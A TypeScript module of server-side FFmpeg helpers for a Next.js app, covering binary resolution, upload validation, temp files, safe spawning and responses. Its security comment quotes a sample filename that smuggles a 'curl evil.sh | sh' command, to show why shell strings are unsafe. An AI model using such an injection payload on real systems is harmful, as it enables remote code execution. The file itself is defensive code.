import { spawn } from "child_process";
import { createRequire } from "module";
import { promises as fs } from "fs";
import os from "os";
import path from "path";
import { NextResponse } from "next/server";

/**
 * Shared server-side media helpers.
 *
 * SECURITY: every FFmpeg call in this project must go through runFFmpeg().
 * It uses spawn() with an argument ARRAY, so arguments are passed to the
 * process directly and never parsed by a shell. Building a command string
 * and passing it to exec() lets a crafted filename inject shell commands —
 * e.g. a file named:  song".mp3"; curl evil.sh | sh; ffmpeg -i "
 * would break out of the quotes and run as the server user.
 */

/* ===================================================== */
/* BINARY RESOLUTION                                     */
/* ===================================================== */

/**
 * Where to find ffmpeg and ffprobe.
 *
 * spawn("ffmpeg") only works if the binary is on PATH, which depends entirely
 * on the build image. That assumption broke in production: the host's builder
 * did not read nixpacks.toml, shipped an image with Node and no ffmpeg, and
 * every server-side tool failed while the build and deploy both reported
 * success.
 *
 * Depending on the image is the fragile part, so the binaries now ship as npm
 * dependencies (ffmpeg-static, ffprobe-static) and travel with the code —
 * whatever the platform decides to build. Order of preference:
 *
 *   1. FFMPEG_PATH / FFPROBE_PATH   an explicit override for odd environments
 *   2. the bundled npm binary        deterministic, present after npm install
 *   3. PATH                          a system install, if there is one
 *
 * Resolved through createRequire rather than a static import so the bundler
 * never tries to trace a 70 MB executable, and a package that failed to
 * install degrades to the PATH lookup instead of crashing the module.
 */
const requireBinary = createRequire(import.meta.url);

let cachedPaths: { ffmpeg: string; ffprobe: string } | null = null;

function resolveBinaries(): { ffmpeg: string; ffprobe: string } {
    if (cachedPaths) return cachedPaths;

    let ffmpeg = process.env.FFMPEG_PATH?.trim() || "";
    let ffprobe = process.env.FFPROBE_PATH?.trim() || "";

    if (!ffmpeg) {
        try {
            const resolved = requireBinary("ffmpeg-static");
            ffmpeg = typeof resolved === "string" ? resolved : resolved?.default ?? "";
        } catch {
            // Not installed — fall through to PATH.
        }
    }

    if (!ffprobe) {
        try {
            const resolved = requireBinary("ffprobe-static");
            ffprobe = typeof resolved?.path === "string" ? resolved.path : "";
        } catch {
            // Not installed — fall through to PATH.
        }
    }

    cachedPaths = {
        ffmpeg: ffmpeg || "ffmpeg",
        ffprobe: ffprobe || "ffprobe",
    };

    return cachedPaths;
}

/** Exposed so the health check can report which binary it actually used. */
export function ffmpegBinaryPath(): string {
    return resolveBinaries().ffmpeg;
}

/* ===================================================== */
/* LIMITS                                                */
/* ===================================================== */

export const MAX_AUDIO_BYTES = 100 * 1024 * 1024; // 100 MB
export const MAX_VIDEO_BYTES = 500 * 1024 * 1024; // 500 MB

/** Hard ceiling on how long a single FFmpeg job may run. */
export const FFMPEG_TIMEOUT_MS = 5 * 60 * 1000;

export const AUDIO_EXTENSIONS = [
    ".mp3",
    ".wav",
    ".m4a",
    ".m4r",
    ".ogg",
    ".oga",
    ".aac",
    ".flac",
    ".webm",
    ".mpeg",
    ".mpga",
    ".opus",
];

export const VIDEO_EXTENSIONS = [
    ".mp4",
    ".mov",
    ".webm",
    ".mkv",
    ".avi",
    ".m4v",
    ".mpeg",
    ".mpg",
];

/* ===================================================== */
/* VALIDATION                                            */
/* ===================================================== */

export class MediaError extends Error {
    status: number;

    constructor(message: string, status = 400) {
        super(message);
        this.name = "MediaError";
        this.status = status;
    }
}

/**
 * Strip a filename down to characters that are safe on any filesystem.
 * The result is used for the DOWNLOAD name only — never for a shell.
 */
export function safeBaseName(fileName: string, fallback = "audio"): string {
    const base = path.parse(fileName).name;

    const cleaned = base
        .replace(/[^a-zA-Z0-9_-]/g, "_")
        .replace(/_{2,}/g, "_")
        .slice(0, 80);

    return cleaned || fallback;
}

/** Extension taken from the ALLOW-LIST, never from raw user input. */
export function safeExtension(
    fileName: string,
    allowed: string[],
    fallback = ".bin"
): string {
    const lower = fileName.toLowerCase();
    const match = allowed.find((extension) => lower.endsWith(extension));

    return match ?? fallback;
}

export interface ValidatedUpload {
    file: File;
    extension: string;
    baseName: string;
}

export function validateUpload(
    value: FormDataEntryValue | null,
    options: { allowed: string[]; maxBytes: number; label?: string }
): ValidatedUpload {
    const label = options.label ?? "file";

    if (!(value instanceof File)) {
        throw new MediaError(`Please upload a ${label}.`);
    }

    if (value.size === 0) {
        throw new MediaError("That file is empty.");
    }

    if (value.size > options.maxBytes) {
        const limitMb = Math.round(options.maxBytes / (1024 * 1024));
        throw new MediaError(`That file is too large. The limit is ${limitMb} MB.`);
    }

    const lower = value.name.toLowerCase();
    const isAllowed = options.allowed.some((extension) =>
        lower.endsWith(extension)
    );

    if (!isAllowed) {
        throw new MediaError(
            `Unsupported format. Allowed: ${options.allowed
                .map((extension) => extension.replace(".", "").toUpperCase())
                .join(", ")}.`
        );
    }

    return {
        file: value,
        extension: safeExtension(value.name, options.allowed),
        baseName: safeBaseName(value.name),
    };
}

/** Parse a numeric form field with bounds. */
export function parseNumber(
    value: FormDataEntryValue | null,
    options: { min: number; max: number; fallback?: number; label: string }
): number {
    if (value === null || value === "") {
        if (options.fallback !== undefined) return options.fallback;
        throw new MediaError(`Missing ${options.label}.`);
    }

    const parsed = Number(value);

    if (!Number.isFinite(parsed)) {
        throw new MediaError(`Invalid ${options.label}.`);
    }

    if (parsed < options.min || parsed > options.max) {
        throw new MediaError(
            `${options.label} must be between ${options.min} and ${options.max}.`
        );
    }

    return parsed;
}

/** Pick a value from a fixed set — prevents arbitrary strings reaching FFmpeg. */
export function parseChoice<T extends string>(
    value: FormDataEntryValue | null,
    allowed: readonly T[],
    fallback: T
): T {
    if (typeof value !== "string") return fallback;

    const match = allowed.find(
        (option) => option.toLowerCase() === value.toLowerCase()
    );

    return match ?? fallback;
}

/* ===================================================== */
/* TEMP FILES                                            */
/* ===================================================== */

export async function createTempDir(prefix: string): Promise<string> {
    return fs.mkdtemp(path.join(os.tmpdir(), `${prefix}-`));
}

export async function cleanupTempDir(dir: string | null): Promise<void> {
    if (!dir) return;

    try {
        await fs.rm(dir, { recursive: true, force: true });
    } catch (error) {
        console.error("Temp cleanup failed:", error);
    }
}

/** Write an uploaded File into a temp directory and return its path. */
export async function writeUpload(
    dir: string,
    upload: ValidatedUpload,
    name = "input"
): Promise<string> {
    const target = path.join(dir, `${name}${upload.extension}`);
    const buffer = Buffer.from(await upload.file.arrayBuffer());

    await fs.writeFile(target, buffer);

    return target;
}

/* ===================================================== */
/* FFMPEG                                                */
/* ===================================================== */

/**
 * Run FFmpeg safely.
 *
 * Arguments are passed as an array — no shell is involved, so filenames
 * containing quotes, semicolons or backticks are inert.
 */
export function runFFmpeg(
    args: string[],
    binary: "ffmpeg" | "ffprobe" = "ffmpeg"
): Promise<string> {
    return new Promise((resolve, reject) => {
        const executable =
            binary === "ffprobe"
                ? resolveBinaries().ffprobe
                : resolveBinaries().ffmpeg;

        const child = spawn(executable, args, {
            windowsHide: true,
            stdio: ["ignore", "pipe", "pipe"],
        });

        let stdout = "";
        let stderr = "";
        let settled = false;

        const timer = setTimeout(() => {
            if (settled) return;
            settled = true;
            child.kill("SIGKILL");
            reject(
                new MediaError(
                    "Processing took too long and was stopped. Try a shorter file.",
                    504
                )
            );
        }, FFMPEG_TIMEOUT_MS);

        child.stdout?.on("data", (chunk) => {
            stdout += chunk.toString();
        });

        child.stderr?.on("data", (chunk) => {
            stderr += chunk.toString();
        });

        child.on("error", () => {
            if (settled) return;
            settled = true;
            clearTimeout(timer);
            reject(
                new MediaError(
                    `${binary} is not available on the server. Install it and make sure it is on PATH.`,
                    500
                )
            );
        });

        child.on("close", (code) => {
            if (settled) return;
            settled = true;
            clearTimeout(timer);

            if (code === 0) {
                resolve(stdout);
                return;
            }

            // Log the detail server-side; never expose FFmpeg internals to the client.
            console.error(`${binary} exited ${code}:`, stderr.slice(-2000));
            reject(
                new MediaError(
                    "Could not process that file. It may be corrupted or in an unsupported codec.",
                    422
                )
            );
        });
    });
}

/** Read media metadata as JSON via ffprobe. */
export async function probeMedia(filePath: string): Promise<unknown> {
    const output = await runFFmpeg(
        [
            "-v",
            "quiet",
            "-print_format",
            "json",
            "-show_format",
            "-show_streams",
            filePath,
        ],
        "ffprobe"
    );

    try {
        return JSON.parse(output);
    } catch {
        throw new MediaError("Could not read that file's metadata.", 422);
    }
}

/* ===================================================== */
/* RESPONSES                                             */
/* ===================================================== */

export async function fileResponse(
    filePath: string,
    options: { contentType: string; downloadName: string }
): Promise<NextResponse> {
    const buffer = await fs.readFile(filePath);

    if (buffer.length === 0) {
        throw new MediaError("Processing produced an empty file.", 500);
    }

    return new NextResponse(new Uint8Array(buffer), {
        status: 200,
        headers: {
            "Content-Type": options.contentType,
            // encodeURIComponent keeps quotes/newlines out of the header.
            "Content-Disposition": `attachment; filename="${encodeURIComponent(
                options.downloadName
            )}"`,
            "Content-Length": String(buffer.length),
            "Cache-Control": "no-store",
            "X-Content-Type-Options": "nosniff",
        },
    });
}

/** Turn any thrown value into a safe JSON error response. */
export function errorResponse(error: unknown): NextResponse {
    if (error instanceof MediaError) {
        return NextResponse.json({ error: error.message }, { status: error.status });
    }

    console.error("Unhandled media route error:", error);

    return NextResponse.json(
        { error: "Something went wrong while processing your file." },
        { status: 500 }
    );
}